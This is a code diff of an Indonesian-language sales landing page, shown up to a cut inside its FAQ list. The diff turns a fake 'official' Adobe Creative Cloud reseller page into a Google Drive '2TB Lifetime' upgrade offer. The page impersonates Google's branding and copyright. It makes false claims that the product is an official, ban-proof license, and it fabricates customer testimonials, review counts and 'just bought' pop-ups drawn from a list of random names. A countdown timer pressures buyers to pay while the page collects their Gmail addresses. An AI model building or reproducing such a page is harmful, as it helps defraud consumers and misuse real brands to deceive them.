@@ -4,9 +4,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Adobe Creative Cloud - Official Resmi</title>
+    <title>Upgrade Google Drive & Photos Unlimited - Penawaran Spesial!</title>
     <link rel="icon" type="image/png"
-        href="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4c/Adobe_Creative_Cloud_rainbow_icon.svg/240px-Adobe_Creative_Cloud_rainbow_icon.svg.png">
+        href="https://upload.wikimedia.org/wikipedia/commons/thumb/1/12/Google_Drive_icon_%282020%29.svg/330px-Google_Drive_icon_%282020%29.svg.png">
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -37,8 +37,8 @@
 
     <style>
         :root {
-            --primary: #E31E24;
-            --primary-dark: #C21B20;
+            --primary: #1a73e8;
+            --primary-dark: #1557b0;
             --secondary: #F5F5F7;
             --text-main: #1D1D1F;
             --text-secondary: #86868B;
@@ -79,42 +79,6 @@
             }
         }
 
-        /* Flash Sale Card & Sheet */
-
-        .sheet-backdrop {
-            opacity: 0;
-            transition: opacity .18s ease;
-        }
-
-        .sheet-panel {
-            transform: translateY(14px);
-            opacity: 0;
-            transition: transform .22s ease, opacity .22s ease;
-        }
-
-        .sheet-open .sheet-backdrop {
-            opacity: 1;
-        }
-
-        .sheet-open .sheet-panel {
-            transform: translateY(0);
-            opacity: 1;
-        }
-
-        .no-bounce {
-            overscroll-behavior: contain;
-        }
-
-        @keyframes shimmer {
-            0% {
-                transform: translateX(-100%);
-            }
-
-            100% {
-                transform: translateX(100%);
-            }
-        }
-
         /* Glassmorphism Header */
         .sticky-header {
             position: sticky;
@@ -146,7 +110,7 @@
         .modern-input:focus {
             border-color: var(--primary);
             background: white;
-            box-shadow: 0 0 0 3px rgba(227, 30, 36, 0.1);
+            box-shadow: 0 0 0 3px rgba(26, 115, 232, 0.1);
         }
 
         .input-icon {
@@ -173,6 +137,7 @@
         .package-card.selected {
             border-color: var(--primary);
             background: #F0F7FF;
+            cursor: default;
         }
 
         .package-check {
@@ -235,8 +200,8 @@
 
         .payment-option.selected {
             border-color: var(--primary);
-            background: #FEF2F2;
-            box-shadow: 0 2px 8px rgba(227, 30, 36, 0.1);
+            background: #F0F7FF;
+            box-shadow: 0 2px 8px rgba(26, 115, 232, 0.1);
         }
 
         .payment-option img {
@@ -265,7 +230,7 @@
             font-weight: 600;
             cursor: pointer;
             transition: transform 0.1s, background 0.2s;
-            box-shadow: 0 4px 12px rgba(227, 30, 36, 0.25);
+            box-shadow: 0 4px 12px rgba(26, 115, 232, 0.25);
             display: flex;
             align-items: center;
             justify-content: center;
@@ -383,13 +348,23 @@
             width: 32px;
             height: 32px;
             border-radius: 50%;
-            background: linear-gradient(135deg, #FFD1D1 0%, #FFE4E4 100%);
+            background: linear-gradient(135deg, #dbeafe 0%, #eff6ff 100%);
             color: var(--primary);
             display: flex;
             align-items: center;
             justify-content: center;
             font-weight: bold;
             font-size: 14px;
+        }
+
+        .t-review-img {
+            width: 100%;
+            height: 120px;
+            object-fit: cover;
+            border-radius: 8px;
+            margin-top: 8px;
+            cursor: pointer;
+            border: 1px solid var(--border);
         }
 
         .t-info h4 {
@@ -412,6 +387,7 @@
             line-height: 1.5;
             display: -webkit-box;
             -webkit-line-clamp: 3;
+            line-clamp: 3;
             -webkit-box-orient: vertical;
             overflow: hidden;
         }
@@ -550,7 +526,7 @@
         }
 
         .copy-btn {
-            background: rgba(227, 30, 36, 0.1);
+            background: rgba(26, 115, 232, 0.1);
             color: var(--primary);
             border: none;
             padding: 4px 10px;
@@ -558,6 +534,44 @@
             font-size: 12px;
             font-weight: 600;
             cursor: pointer;
+        }
+
+        /* New Card & Sheet Styles */
+
+        /* Bottom sheet animation */
+        .sheet-backdrop {
+            opacity: 0;
+            transition: opacity .18s ease;
+        }
+
+        .sheet-panel {
+            transform: translateY(14px);
+            opacity: 0;
+            transition: transform .22s ease, opacity .22s ease;
+        }
+
+        .sheet-open .sheet-backdrop {
+            opacity: 1;
+        }
+
+        .sheet-open .sheet-panel {
+            transform: translateY(0);
+            opacity: 1;
+        }
+
+        /* prevent overscroll bounce inside sheet */
+        .no-bounce {
+            overscroll-behavior: contain;
+        }
+
+        @keyframes shimmer {
+            0% {
+                transform: translateX(-100%);
+            }
+
+            100% {
+                transform: translateX(100%);
+            }
         }
     </style>
 </head>
@@ -571,7 +585,7 @@
         </div>
         <div class="text-sm">
             <p class="font-semibold text-gray-900" id="toast-name">Budi Santoso</p>
-            <p class="text-gray-500 text-xs">Baru saja membeli paket 1 Tahun</p>
+            <p class="text-gray-500 text-xs">Baru saja membeli paket 2TB Lifetime</p>
         </div>
     </div>
 
@@ -581,15 +595,15 @@
             <!-- Header -->
             <div class="sticky-header px-6 py-4 flex items-center justify-between">
                 <div class="flex items-center gap-2">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4c/Adobe_Creative_Cloud_rainbow_icon.svg/48px-Adobe_Creative_Cloud_rainbow_icon.svg.png"
-                        alt="Adobe Logo" class="w-8 h-8">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/12/Google_Drive_icon_%282020%29.svg/330px-Google_Drive_icon_%282020%29.svg.png"
+                        alt="Google Drive Logo" class="w-8 h-8">
                     <div>
-                        <h1 class="font-bold text-lg leading-none">Adobe CC</h1>
-                        <p class="text-xs text-gray-500 font-medium">Official Resmi</p>
+                        <h1 class="font-bold text-lg leading-none">Google Drive</h1>
+                        <p class="text-xs text-gray-500 font-medium">Official Upgrade</p>
                     </div>
                 </div>
-                <div class="bg-red-50 text-red-600 px-3 py-1 rounded-full text-xs font-semibold">
-                    <i class="fas fa-check-circle mr-1"></i> Garansi
+                <div class="bg-blue-50 text-blue-600 px-3 py-1 rounded-full text-xs font-semibold">
+                    <i class="fas fa-check-circle mr-1"></i> Garansi Resmi
                 </div>
             </div>
 
@@ -600,9 +614,9 @@
                         class="inline-block bg-red-100 text-red-600 px-3 py-1 rounded-full text-xs font-bold mb-3 animate-pulse">
                         🔥 PROMO TERBATAS
                     </span>
-                    <h2 class="text-2xl font-bold mb-2">Upgrade Akun Pribadi</h2>
-                    <p class="text-gray-500 text-sm px-4">Dapatkan akses full Adobe Creative Cloud ke email pribadi
-                        Anda. Legal, Aman & Bergaransi.</p>
+                    <h2 class="text-2xl font-bold mb-2">Upgrade Penyimpanan Google</h2>
+                    <p class="text-gray-500 text-sm px-4">Sekali bayar, aktif seumur hidup (Lifetime) di akun sendiri.
+                        Legal & Aman.</p>
                 </div>
 
                 <!-- Form -->
@@ -613,10 +627,9 @@
                         <div id="package-selection-container" class="space-y-3">
                             <!-- Package cards will be rendered here by JavaScript -->
                         </div>
-                        <input type="hidden" id="selectedPackage" name="package" value="yearly">
+                        <input type="hidden" id="selectedPackage" name="package" value="lifetime">
                     </div>
 
-                    <!-- Testimonials -->
                     <!-- Testimonials -->
                     <div class="animate-fade-in" style="animation-delay: 0.18s">
                         <div class="flex items-center justify-between mb-3 px-1">
@@ -625,7 +638,7 @@
                                 class="flex items-center gap-1.5 bg-yellow-50 px-2 py-1 rounded-lg border border-yellow-100">
                                 <i class="fas fa-star text-yellow-500 text-xs"></i>
                                 <span class="text-xs font-bold text-gray-800">4.9/5.0</span>
-                                <span class="text-[10px] text-gray-500">(2.8k+ Ulasan)</span>
+                                <span class="text-[10px] text-gray-500">(15.8k+ Ulasan)</span>
                             </div>
                         </div>
                         <div class="testimonial-carousel" id="testimonial-container">
@@ -651,7 +664,7 @@
 
                         <div class="input-group">
                             <input type="email" id="email" name="email" class="modern-input"
-                                placeholder="Email untuk Adobe ID" required>
+                                placeholder="Email Gmail (untuk di-upgrade)" required>
                             <i class="fas fa-envelope input-icon"></i>
                         </div>
                     </div>
@@ -672,7 +685,7 @@
 
                     <!-- Hidden Fields -->
                     <input type="text" name="honeypot" style="display: none" tabindex="-1" autocomplete="off">
-                    <input type="hidden" name="sheetName" value="adobe">
+                    <input type="hidden" name="sheetName" value="gdrive">
 
                     <!-- Payment Method -->
                     <div class="space-y-3 animate-fade-in" style="animation-delay: 0.25s">
@@ -704,8 +717,7 @@
                         class="h-6">
                 </div>
 
-                <p class="text-center text-xs text-gray-400 mt-8">© 2025 Adobe Official Reseller. All Rights Reserved.
-                </p>
+                <p class="text-center text-xs text-gray-400 mt-8">© 2026 Google Drive. All Rights Reserved.</p>
             </div>
 
             <!-- Sticky Bottom Bar -->
@@ -714,7 +726,7 @@
                 <div class="max-w-[520px] mx-auto flex items-center justify-between gap-4">
                     <div>
                         <p class="text-xs text-gray-500">Total Pembayaran</p>
-                        <p class="text-xl font-bold text-red-600" id="total-price-display">Rp 350.xxx</p>
+                        <p class="text-xl font-bold text-blue-600" id="total-price-display">Rp 250.xxx</p>
                     </div>
                     <button type="button" id="submit-btn" class="btn-checkout flex-1" onclick="handleFormSubmit()">
                         Beli Sekarang <i class="fas fa-arrow-right"></i>
@@ -734,7 +746,7 @@
 
             <div class="p-6 pb-24">
                 <!-- Timer -->
-                <div class="bg-[#E31E24] text-white rounded-xl p-4 text-center mb-6 shadow-lg shadow-red-200">
+                <div class="bg-blue-600 text-white rounded-xl p-4 text-center mb-6 shadow-lg shadow-blue-200">
                     <p class="text-xs opacity-80 mb-1">Selesaikan pembayaran dalam</p>
                     <div class="text-2xl font-bold font-mono" id="countdown">23:59:59</div>
                 </div>
@@ -745,7 +757,7 @@
                     <div class="absolute top-0 left-0 w-full h-1 bg-gray-200"></div>
                     <p class="text-gray-500 text-sm mb-1">Total yang harus dibayar</p>
                     <div class="flex items-center justify-center gap-2 mb-2">
-                        <h1 class="text-3xl font-bold text-gray-900" id="payment-amount">Rp 350.123</h1>
+                        <h1 class="text-3xl font-bold text-gray-900" id="payment-amount">Rp 250.123</h1>
                         <button class="copy-btn" onclick="copyText('payment-amount-raw')"><i
                                 class="far fa-copy"></i></button>
                     </div>
@@ -859,7 +871,7 @@
                     </ul>
 
                     <button id="btnOk" type="button"
-                        class="mt-4 h-12 w-full rounded-2xl bg-[#E31E24] text-sm font-semibold text-white active:scale-[.99]">
+                        class="mt-4 h-12 w-full rounded-2xl bg-[#1a73e8] text-sm font-semibold text-white active:scale-[.99]">
                         Oke, Mengerti
                     </button>
                 </div>
@@ -907,13 +919,13 @@
     <div id="infoModal" class="modal-overlay">
         <div class="modal-box">
             <div
-                class="w-16 h-16 bg-red-100 text-red-600 rounded-full flex items-center justify-center mx-auto mb-4 text-2xl">
+                class="w-16 h-16 bg-blue-100 text-blue-600 rounded-full flex items-center justify-center mx-auto mb-4 text-2xl">
                 <i class="fas fa-info"></i>
             </div>
             <h3 class="text-xl font-bold mb-2" id="modalTitle">Judul</h3>
             <p class="text-gray-500 mb-6" id="modalMessage">Pesan</p>
             <button onclick="closeModal('infoModal')"
-                class="w-full bg-[#E31E24] text-white font-bold py-3 rounded-xl">Mengerti</button>
+                class="w-full bg-blue-600 text-white font-bold py-3 rounded-xl">Mengerti</button>
         </div>
     </div>
 
@@ -952,69 +964,58 @@
         const FIRST_NAMES = ["Budi Santoso", "Ayu", "Rahmat", "Citra Dewi Kusuma", "Bayu Pratama", "Lina", "Wulan", "Adi", "Farhan Syahputra", "Hendra Wijaya", "Nana Puspita Dewi", "Joko", "Mega Sari", "Gilang Pramana Putra", "Sari", "Dedi", "Eka Suryani", "Teguh", "Putri Lestari Ayu", "Andi", "Bagus Wijaya", "Ilham Saputra Nugraha", "Rizal", "Mira Astuti", "Puspita", "Hari", "Tri Saputra", "Cahya Pratama", "Surya Darmawan Putra", "Wahyu Ramadhan", "Agus", "Indra Permana", "Linda", "Fajar Mahendra Saputra", "Yusuf", "Pramono Adi Nugroho", "Sinta Dewi", "Bima Pratama", "Dian", "Hasan Basri", "Nurul Aini", "Arif Budiman", "Feri", "Lukman Hakim", "Rangga", "Rini Anggraini Putri", "Tono", "Hadi Prasetyo", "Elisa Purnama", "Anisa Rahma", "Gunawan", "Melati", "Bagus Prasetyo Ramadhan", "Septi Amelia", "Cindy Amelia", "Windi Saputri", "Galih Pratama", "Evi", "Putra", "Slamet Riyadi", "Latif Hidayat", "Gita Puspita", "Darmawan", "Maya", "Erik Saputra Pratama", "Jani", "Jefri Maulana", "Bella Sari", "Maulana", "Novi Andriana Lestari", "Fajar Nugroho", "Taufik Hidayat", "Prasetyo", "Samsul", "Agung", "Endang", "Indah", "Hana Pertiwi", "Mirna", "Yulia", "Panca", "Niken", "Rio", "Adi Putra Ramadhan", "Ganda", "Wahida", "Robby Saputra", "Halim", "Firman Saputra", "Berlian Putra", "Ari", "Joko Setiawan", "Mustika", "Bahar", "Mega", "Erlangga", "Sofyan", "Doni", "Fatimah", "Dian Purnama Sari", "Rama", "Imam Saputra", "Johan", "Gusman", "Lintang", "Nabila", "Beni", "Purnama", "Murni", "Malik", "Nurlan", "Doni Saputra", "Lastri", "Berlinda", "Rasyid", "Tari", "Nia", "Tirta", "Juli Andriani", "Lutfi", "Suci", "Arman", "Yani", "Citra Ayu", "Harto", "Rangga Pratama", "Febrina", "Indra Gunawan Saputra", "Tomi", "Sutrisno", "Risma", "Jihan Ayu Pratiwi", "Lestari", "Dewi Kusuma", "Fahmi", "Rifki", "Wira", "Putra Wijaya", "Beni Setiawan", "Asep", "Gerry", "Prasetia", "Euis", "Latif", "Pajar", "Rahmat Hidayat", "Rudi", "Tika", "Danu", "Hesti", "Syahrul", "Anwar", "Miranti", "Nuraini", "Nurman", "Eman Kurnia", "Nirmala", "Hari Susanto", "Taufan", "Tono Prabowo", "Bayu Saputra Nugroho", "Darma", "Nurlaila", "Hafid", "Mustofa", "Elok", "Gunarto", "Novi", "Lasman", "Jamaludin", "Andi Wijaya Putra", "Herman", "Mila", "Wibowo", "Prayitno", "Adi Saputra", "Jamal", "Irfan", "Iskandar", "Yudha", "Lutris", "Samsul Hidayat", "Heru", "Bagus", "Rudianto", "Nanda Putri", "Laila Rahma", "Frans", "Hilda", "Cahya", "Rudi Pratama", "Setiawan", "Rangga Saputra", "Puspa", "Doni Prasetyo", "Nurul", "Febri", "Mega Sari Lestari", "Suyatno", "Tomiadi", "Fikri", "Lani", "Intan", "Johan Saputra", "Iwan", "Berliano", "Ilham", "Teddy", "Lani Puspita", "Eka Putri Andayani", "Hani", "Adi Wijaya", "Adit", "Dicky", "Gopal", "Pramono", "Gunadi", "Gilang", "Joko Prayitno Adi", "Mira", "Puspita Sari", "Maulana Hakim", "Putri Ayu Lestari", "Malik Prasetyo", "Toriq", "Joni", "Gilang Pratama", "Bagus Wijaya Putra", "Berlian", "Wandi", "Nurman Saputra", "Fajarudin", "Lutfi Pratama", "Citra", "Nanda", "Laras", "Tuti", "Yani Pratiwi", "Gusman Saputra", "Rangga Putra", "Prasetiawan", "Ismail", "Heri", "Adi Nugroho", "Putri", "Prasetyo Adi", "Dona", "Gani", "Jihan", "Puspita Dewi", "Rizal Maulana", "Mahendra", "Ayu Pratiwi", "Rangga Setiawan", "Lina Sari", "Fani", "Adi Wijaya Putra", "Sari Melati", "Andri", "Bima", "Teguh Santoso Adi", "Fajar", "Wulan Dewi", "Rama Pratama", "Nana", "Farhan", "Dion", "Melati Pertiwi", "Adi Putra", "Joko Santoso", "Doni Setiawan", "Lintang Pertiwi", "Septi", "Gopal Pramana", "Tomi Pratama", "Rio Nugraha", "Cindy", "Hafid Saputra", "Hendra", "Niken Lestari", "Rangga Nugroho", "Putri Ayu", "Sofyan Hidayat", "Robby", "Bima Saputra", "Indra", "Adi Kurniawan", "Nanda Saputra", "Gilang Saputra", "Wahyu", "Puspita Ayu", "Rudi Hartono", "Wulan Dewi Pertiwi", "Ayu Pratiwi Lestari", "Tono Adi", "Dedi Kurniawan", "Prasetyo Ramadhan", "Adi Setiawan", "Mira Lestari", "Farhan Syahputra Adi", "Nurul Hidayah", "Sari Anggraini", "Bayu", "Eman", "Putra Adi Nugroho", "Lestari Ayu", "Bambang", "Rangga Hidayat", "Mega Putri", "Adi Nugraha", "Anisa", "Siska", "Wandi Putra", "Fajar Saputra", "Gunawan Pratama", "Heri Setiawan", "Arif", "Ilham Nugroho", "Bagus Pratama", "Erlangga Putra", "Rian", "Pandu", "Tari Ayu", "Hendro", "Risma Ayu", "Adi Pratama", "Septi Ayu", "Bambang Santoso", "Lukman", "Gani Saputra", "Hasan", "Feri Kurniawan", "Tirta", "Bambang Prasetyo", "Pajar Saputra", "Arman Putra", "Murni Ayu", "Hafiz", "Euis Sari", "Bayu Nugroho", "Tomi Saputra", "Gerry Pratama", "Arif Prasetyo", "Johan Putra", "Hafid Nugraha", "Nabila Pertiwi", "Latif Saputra", "Ari Saputra", "Rio Saputra", "Tono Saputra", "Wandi Saputra", "Mahendra Putra", "Ilham Pratama", "Putri Dewi", "Adi Lestari", "Rangga Maulana", "Bayu Hidayat", "Fani Puspita", "Taufik", "Bagus Saputra", "Novi Puspita", "Rahmat Hidayatullah Putra", "Prayitno Saputra", "Adi Ramadhan", "Bayu Wijaya", "Gilang Nugraha", "Rangga Prasetyo", "Putra Purnama", "Wulan Pertiwi", "Adi Wijaya Ramadhan", "Budi", "Rian Pratama", "Samsul Nugroho", "Wahyu Saputra", "Teguh Prasetyo", "Fikri Nugraha", "Rizki Pratama"];
 
         const testimonialData = [
-            { name: "Budi Santoso", text: "Proses cepat banget, hitungan menit Adobe langsung aktif di email sendiri. Mantap min!", rating: 5 },
-            { name: "Siti Aminah", text: "Awalnya ragu karena murah, tapi ternyata beneran legal dan full fitur. Makasih ya!", rating: 5 },
-            { name: "Agus Pratama", text: "Solusi hemat buat desainer freelance kayak saya. Fitur AI Firefly nya jalan lancar jaya.", rating: 5 },
-            { name: "Rina Kusuma", text: "Adminnya ramah dan fast respon. Dipandu sampe bisa login. Sangat recommended!", rating: 5 },
-            { name: "Doni Setiawan", text: "Udah langganan tahun kedua disini. Gak pernah ada masalah, cloud storage aman.", rating: 5 },
-            { name: "Sari Wulandari", text: "Harga kaki lima kualitas bintang lima. Jauh lebih hemat daripada beli langsung di website.", rating: 5 },
-            { name: "Eko Saputra", text: "Beneran dapet 100GB cloud, bisa sinkron ke iPad juga. Gak nyesel beli disini.", rating: 5 },
-            { name: "Dewi Lestari", text: "Prosesnya gampang, tinggal transfer, kirim bukti, langsung diproses. Top markotop!", rating: 5 },
-            { name: "Hendra Wijaya", text: "Buat yang cari Adobe murah dan resmi, disini tempatnya. Garansinya juga jelas.", rating: 5 },
-            { name: "Maya Putri", text: "Sangat membantu buat tugas kuliah. Fitur lengkap semua aplikasi bisa di download.", rating: 5 },
-            { name: "Rizky Ramadhan", text: "Kirain bakal ribet, ternyata simpel banget. Email masuk langsung terima invite.", rating: 5 },
-            { name: "Putri Anggraini", text: "Kualitas oke, pelayanan oke. Bakal rekomendasiin ke temen-temen kantor.", rating: 5 },
-            { name: "Anton Kurniawan", text: "Transparan banget, dijelasin detail kalau ini via team plan. Yang penting legal!", rating: 5 },
-            { name: "Wulan Dari", text: "Baru pertama kali coba dan puas banget. Semoga awet terus langganannya.", rating: 5 },
-            { name: "Bayu Nugroho", text: "Mantap jiwa! Akhirnya bisa pake Photoshop original tanpa crack-crack an.", rating: 5 }
+            { name: "Budi Santoso", text: "Proses upgrade sat set, 5 menit langsung jadi 2TB. Gokil! Harga murah tapi kualitas original.", rating: 5, img: "https://pixvid.org/images/2026/01/16/CmekN.webp" },
+            { name: "Rina Amelia", text: "Awalnya ngeri-ngeri sedap, tapi ternyata amanah. Storage legaaaa banget sekarang. Thanks min!", rating: 5, img: "https://pixvid.org/images/2026/01/16/CmeTv.webp" },
+            { name: "Dedi Kurniawan", text: "Buat backup foto anak istri paling pas. Gak pusing notif penuh lagi. Langsung aktif di akun sendiri.", rating: 5, img: "https://pixvid.org/images/2026/01/16/Cmey5.webp" },
+            { name: "Sinta Pratiwi", text: "Recommended seller! Admin ramah, dipandu sampe sukses. Garansi juga jelas.", rating: 5, img: "https://pixvid.org/images/2026/01/16/CmeB7.webp" },
+            { name: "Agung Wijaya", text: "Harga kaki lima, kualitas bintang lima. Legal dan aman. Udah cek di Google One beneran 2TB.", rating: 5, img: "https://pixvid.org/images/2026/01/16/Cm08T.webp" },
+            { name: "Putri Lestari", text: "Bye-bye langganan bulanan. Sekali bayar buat selamanya. Hemat bgt buat mahasiswa.", rating: 5, img: "https://pixvid.org/images/2026/01/16/Cm0ti.webp" },
+            { name: "Bayu Pratama", text: "Udah upgrade akun ke-2 disini. Gapernah mengecewakan. Proses cepet dan anti ribet.", rating: 5, img: "https://pixvid.org/images/2026/01/16/Cm0M1.webp" },
+            { name: "Eko Saputra", text: "Mantap jiwa! Google Photos jadi unlimited rasanya. Upload video 4K gas terus.", rating: 5, img: "https://pixvid.org/images/2026/01/16/Cm0cx.webp" },
+            { name: "Fajar Nugraha", text: "Solusi terbaik buat freelancer kek saya. Kirim file gede ga masalah lagi. Sukses terus gan.", rating: 5, img: "https://pixvid.org/images/2026/01/16/CmUW4.webp" },
+            { name: "Maya Dewi", text: "Fast response, proses mudah, garansi jelas. Top banget pelayanannya.", rating: 5, img: "https://pixvid.org/images/2026/01/16/CmUFc.webp" },
+            { name: "Rudi Hartono", text: "Sempet skeptis tapi bukti bicara. Storage beneran nambah permanen. Mantul!", rating: 5, img: "https://pixvid.org/images/2026/01/16/CmUAP.webp" },
+            { name: "Wulan Sari", text: "Gak nyesel beli disini. Data aman, privasi terjaga. Bakal rekomendasiin ke temen kantor.", rating: 5, img: "https://pixvid.org/images/2026/01/16/CmUL8.webp" },
+            { name: "Tono Jaya", text: "Thank you min! Akhirnya email gak merah lagi. Bisa terima email kerjaan dengan tenang.", rating: 5, img: "https://pixvid.org/images/2026/01/16/CmkzH.webp" }
         ];
 
         const fullFeaturesList = [
-            "Akses 20+ Aplikasi Adobe (Photoshop, Illustrator, Premiere Pro, After Effects, InDesign, dll)",
-            "Penyimpanan Cloud 100GB untuk backup file project",
-            "Sinkronisasi Antar Perangkat (Desktop, Mobile, Web)",
-            "Akses ke Adobe Fonts (Ribuan Font Premium)",
-            "Akses ke Adobe Stock (Asset Foto & Video)",
-            "Fitur AI Generatif (Adobe Firefly)",
-            "Update Otomatis Fitur Terbaru",
-            "Adobe Portfolio & Behance",
-            "Akses Offline (Tanpa Internet)",
-            "Keamanan Terenkripsi & Legal",
-            "Support Mac, Windows, iPad, iPhone, Android",
-            "Bisa pindah device (Logout/Login)",
-            "Full Garansi selama durasi langganan"
+            "<strong>Kapasitas 2TB:</strong> Nikmati penyimpanan raksasa 2TB yang terbagi untuk Google Drive, Google Photos, dan Gmail.",
+            "<strong>Akses File Di Mana Saja:</strong> Buka dan edit file Anda dari komputer, tablet, atau smartphone.",
+            "<strong>Satu Solusi Terintegrasi:</strong> Semua kebutuhan penyimpanan Anda dalam satu paket hemat.",
+            "<strong>Keamanan Kelas Dunia:</strong> File Anda dilindungi oleh infrastruktur keamanan canggih dari Google.",
+            "<strong>Berbagi & Kolaborasi Mudah:</strong> Bagikan file dan folder dengan mudah, serta bekerja bersama secara real-time.",
+            "<strong>Sekali Bayar Seumur Hidup:</strong> Tanpa biaya langganan bulanan atau tahunan.",
+            "<strong>Gunakan Akun Pribadi Anda:</strong> Upgrade dilakukan langsung pada akun Google yang sudah Anda miliki.",
+            "<strong>100% Aman & Bergaransi:</strong> Produk asli dengan jaminan privasi penuh."
         ];
 
         const faqList = [
-            { q: "Apakah produk ini resmi?", a: "Ya, produk yang kami tawarkan 100% original dan legal. Aktivasi dilakukan melalui undangan resmi dari Adobe ke email Anda." },
-            { q: "Apakah ini aplikasi Crack/Bajakan?", a: "BUKAN. Ini adalah langganan resmi (Official). Anda download dan update aplikasi langsung dari Adobe Creative Cloud, bukan dari link pihak ketiga." },
-            { q: "Kenapa harganya jauh lebih murah?", a: "Kami menggunakan metode Family/Team plan atau promo regional resmi yang memungkinkan harga per user menjadi lebih terjangkau namun tetap legal dan aman." },
-            { q: "Bagaimana proses aktivasinya?", a: "Setelah pembayaran, kami akan mengirimkan undangan ke email Adobe Anda. Anda hanya perlu menerima undangan tersebut untuk mengaktifkan lisensi Creative Cloud." },
-            { q: "Apakah bisa pakai email/akun lama?", a: "Bisa. Namun pastikan tidak ada langganan aktif di akun tersebut. Jika ragu, kami sarankan buat akun Adobe baru (gratis) agar proses lebih lancar." },
-            { q: "Apakah ini aman? Perlu password?", a: "Sangat aman. Kami TIDAK PERNAH meminta password akun Adobe Anda. Privasi Anda 100% terjamin." },
-            { q: "Apa saja yang saya dapatkan?", a: "Anda mendapatkan akses FULL ke 20+ aplikasi Adobe (Photoshop, Illustrator, Premiere, dll) dan penyimpanan cloud 100GB." },
-            { q: "Apakah fitur AI (Generative Fill) berfungsi?", a: "Sangat berfungsi! Karena ini akun resmi, semua fitur AI seperti Generative Fill di Photoshop dan Firefly berfungsi 100%." },
-            { q: "Apakah bisa update aplikasi?", a: "Tentu bisa. Anda akan mendapatkan notifikasi update resmi dari Adobe Creative Cloud layaknya pelanggan reguler." },
-            { q: "Apakah bisa digunakan di Mac & Windows?", a: "Ya, lisensi ini cross-platform. Bisa digunakan di MacOS, Windows, iPadOS, dan Android. Satu akun untuk semua device." },
-            { q: "Apakah bisa login di banyak device?", a: "Bisa login di banyak device sekaligus (HP, Laptop, PC, Tablet), namun penggunaan aktif bersamaan dibatasi oleh Adobe (biasanya 2 device)." },
-            { q: "Apakah file saya aman dan privat?", a: "Privasi Anda 100% aman. Cloud storage 100GB yang didapat adalah private milik akun Anda sendiri. Admin tidak bisa melihat file Anda." },
-            { q: "Berapa lama prosesnya?", a: "Prosesnya sangat cepat, biasanya hanya 5-15 menit setelah konfirmasi pembayaran." },
-            { q: "Bagaimana jika masa aktif habis?", a: "Anda bisa melakukan perpanjangan (renew) kembali melalui website ini dengan harga promo yang berlaku saat itu." },
-            { q: "Apakah ada garansi?", a: "Kami memberikan garansi uang kembali penuh jika proses aktivasi gagal karena kesalahan dari pihak kami." }
+            { q: "Apakah ini benar-benar 2TB dan seumur hidup?", a: "Ya, benar. Anda akan mendapatkan penyimpanan 2TB untuk Google Drive dengan sistem pembayaran sekali untuk selamanya. Tidak ada biaya bulanan atau tahunan tersembunyi." },
+            { q: "Bagaimana proses upgrade untuk Google Drive?", a: "Prosesnya otomatis dan terintegrasi dengan akun Google Anda. Setelah pembayaran, penyimpanan pada Google Drive Anda akan langsung ter-upgrade menjadi 2TB. Anda tidak perlu melakukan apa-apa lagi dan bisa langsung menikmati kapasitas 2TB di akun pribadi Anda." },
+            { q: "Apakah ini aman dan legal?", a: "Tentu saja. Metode yang kami gunakan adalah sah melalui fitur Google Workspace. Kami tidak pernah meminta password Anda (untuk upgrade Drive) dan privasi file Anda 100% terjamin. Anda memiliki kontrol penuh atas data Anda." },
+            { q: "Apa bedanya dengan langganan Google One?", a: "Google One adalah layanan langganan resmi dari Google dengan kuota terbatas (misal 2TB) dan biaya bulanan/tahunan. Produk kami memberikan Anda penyimpanan 2TB dengan sistem sekali bayar untuk selamanya, melalui metode upgrade langsung pada akun Anda." },
+            { q: "Bisakah saya memindahkan file lama saya?", a: "Tentu bisa. Karena upgrade ini langsung diterapkan pada akun Google Drive pribadi Anda, semua file lama Anda akan tetap ada di tempatnya dan secara otomatis menjadi bagian dari penyimpanan 2TB yang baru. Anda tidak perlu memindahkan file atau folder apa pun." },
+            { q: "Berapa lama proses aktivasinya?", a: "Prosesnya sangat cepat. Setelah Anda melakukan konfirmasi pembayaran, aktivasi biasanya selesai dalam waktu 5-15 menit, maksimal 1x24 jam." },
+            { q: "Apakah ada garansi?", a: "Kami memberikan garansi uang kembali penuh jika proses upgrade gagal karena kesalahan dari pihak kami. Kami juga memberikan garansi layanan seumur hidup." },
+            { q: "Apakah kapasitas ini mencakup Google Photos dan Gmail?", a: "Ya, penyimpanan 2TB ini bersifat shared storage yang digunakan bersama untuk Google Drive, Google Photos (kualitas asli/original), dan Gmail. Jadi Anda bisa mencadangkan ribuan foto dan video serta ribuan email tanpa khawatir penuh." },
+            { q: "Apakah file saya aman dari intipan admin?", a: "100% Aman. Privasi adalah prioritas utama. Sistem kami hanya menambahkan lisensi/kapasitas ke akun Anda. Kami tidak memiliki akses sama sekali ke file, foto, atau email Anda. Hanya Anda yang bisa mengaksesnya." },
+            { q: "Apakah ini Shared Drive / Team Drive yang bisa hilang sewaktu-waktu?", a: "Bukan. Ini adalah upgrade pada My Drive (Penyimpanan Utama) akun Anda, bukan sekadar Shared Drive yang seringkali rawan hilang. Karena ini lisensi resmi, maka keamanannya terjamin setara dengan akun Google biasa." },
+            { q: "Apakah akun saya berisiko di-banned oleh Google?", a: "Tidak akan. Kami menggunakan metode resmi (Official License) yang mematuhi kebijakan Google. Akun Anda aman dari risiko banned yang biasanya terjadi pada produk ilegal/suntikan." },
+            { q: "Apakah bisa digunakan di banyak perangkat?", a: "Sangat bisa. Anda bisa mengakses penyimpanan 2TB ini dari HP (Android/iOS), Tablet/iPad, Laptop (Windows/Mac), maupun PC. Cukup login dengan akun Google yang sama." },
+            { q: "Bagaimana jika kapasitas 2TB saya penuh?", a: "Jika 2TB penuh, Anda tidak bisa mengupload file baru atau menerima email masuk (jika Gmail penuh). Namun, Anda bisa menghapus file lama atau menghubungi kami jika ada opsi upgrade lebih lanjut di masa depan." },
+            { q: "Apakah saya perlu mengganti akun Google lama saya?", a: "Tidak perlu. Anda cukup mencantumkan alamat email akun Google lama Anda saat pemesanan. Kami akan memproses upgrade langsung di akun tersebut tanpa Anda perlu membuat akun baru." },
